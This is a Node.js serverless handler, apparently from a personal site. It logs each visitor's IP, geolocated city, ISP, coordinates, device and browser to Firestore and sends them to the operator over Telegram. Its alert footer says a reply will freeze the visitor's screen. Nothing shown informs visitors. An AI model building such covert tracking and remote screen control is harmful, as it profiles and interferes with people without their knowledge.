const admin = require('firebase-admin');
const axios = require('axios');
const { actionKeyboard, formatDevice, panel, row } = require('./telegramFormat');

if (!admin.apps.length) {
    admin.initializeApp({
        credential: admin.credential.cert({
            "project_id": "omeryigitler-5abfb",
            "private_key": process.env.FIREBASE_PRIVATE_KEY.replace(/\\n/g, '\n'),
            "client_email": "firebase-adminsdk-fbsvc@omeryigitler-5abfb.iam.gserviceaccount.com"
        })
    });
}

const db = admin.firestore();
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

function normalizeGeoCoordinates(ipData) {
    const lat = Number(ipData?.latitude ?? ipData?.lat);
    const lng = Number(ipData?.longitude ?? ipData?.lng ?? ipData?.lon);

    if (!Number.isFinite(lat) || !Number.isFinite(lng)) return null;
    if (Math.abs(lat) > 90 || Math.abs(lng) > 180) return null;

    return { lat, lng };
}

function normalizeServerGeoPayload(data, fallbackIP, provider) {
    if (!data) return { ip: fallbackIP };

    return {
        ip: data.ip || data.ipAddress || fallbackIP,
        city: data.city || 'Unknown',
        country_name: data.country || data.countryName || data.country_name || 'Unknown',
        country_code: data.country_code || data.countryCode,
        org: data.organization_name || data.organization || data.org || data.connection?.isp || 'Unknown',
        latitude: data.latitude,
        longitude: data.longitude,
        provider
    };
}

async function fetchServerGeo(clientIP) {
    try {
        const geoRes = await axios.get(
            `https://get.geojs.io/v1/ip/geo/${encodeURIComponent(clientIP)}.json`,
            { timeout: 1500 }
        );
        return normalizeServerGeoPayload(geoRes.data, clientIP, 'geojs');
    } catch (geoError) {
        const whoisRes = await axios.get(
            `https://ipwho.is/${encodeURIComponent(clientIP)}`,
            { timeout: 1500 }
        );
        if (whoisRes.data?.success === false) throw new Error('ipwhois failed');
        return normalizeServerGeoPayload(whoisRes.data, clientIP, 'ipwhois');
    }
}

module.exports = async (req, res) => {
    if (req.method !== 'POST') return res.status(200).send('OK');

    let { sessionID, ipData, device, browser, pathname } = req.body;

    if (!sessionID) return res.status(400).send('Missing Session ID');

    try {
        const clientIP = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress;

        if (!ipData || !ipData.city || ipData.ip === '0.0.0.0') {
            try {
                ipData = await fetchServerGeo(clientIP);
            } catch (e) {
                console.warn("Server-side Geo Fetch Failed:", e.message);
                ipData = ipData || { ip: clientIP };
            }
        }

        const geoCoordinates = normalizeGeoCoordinates(ipData);
        const locationData = {
            city: ipData.city || 'Unknown',
            country: ipData.country_name || 'Unknown',
            isp: ipData.org || 'Unknown'
        };

        if (ipData.country_code) locationData.country_code = ipData.country_code;
        if (geoCoordinates) {
            locationData.lat = geoCoordinates.lat;
            locationData.lng = geoCoordinates.lng;
        }

        const sessionData = {
            sessionID,
            ip: clientIP,
            city: ipData.city || 'Unknown',
            country: ipData.country_name || 'Unknown',
            org: ipData.org || 'Unknown',
            location: locationData,
            device: formatDevice(device),
            browser: browser || 'Unknown',
            startTime: new Date().toISOString(),
            status: 'online',
            last_seen: admin.firestore.FieldValue.serverTimestamp(),
        };

        const newHistory = {
            time: new Date().toLocaleTimeString('tr-TR'),
            action: 'Entrance',
            detail: pathname || 'Unknown'
        };

        // History arrayUnion ile düzgün şekilde ekleniyor
        const { ...sessionWithoutHistory } = sessionData;
        await db.collection('visitors_v1').doc(sessionID).set(
            {
                ...sessionWithoutHistory,
                history: admin.firestore.FieldValue.arrayUnion(newHistory)
            },
            { merge: true }
        );

        const telegramMsg = panel({
            title: 'TAURUS // NEURAL LINK',
            subtitle: 'New visitor session established',
            rows: [
                row('🆔', 'Session', sessionID, { code: true }),
                row('🌍', 'Location', `${sessionData.city}, ${sessionData.country}`),
                row('📡', 'IP Address', sessionData.ip, { code: true }),
                row('🏢', 'Network', sessionData.org),
                row('💻', 'Device', sessionData.device),
            ],
            footer: '↩️ Reply to this message with any text → it freezes the screen and shows your text. Or tap a control below.',
        });

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: telegramMsg,
            parse_mode: 'HTML',
            reply_markup: actionKeyboard(sessionID)
        });

        return res.status(200).json({ success: true });
    } catch (error) {
        console.error("Tracker API Error:", error);
        return res.status(500).json({ error: error.message });
    }
};
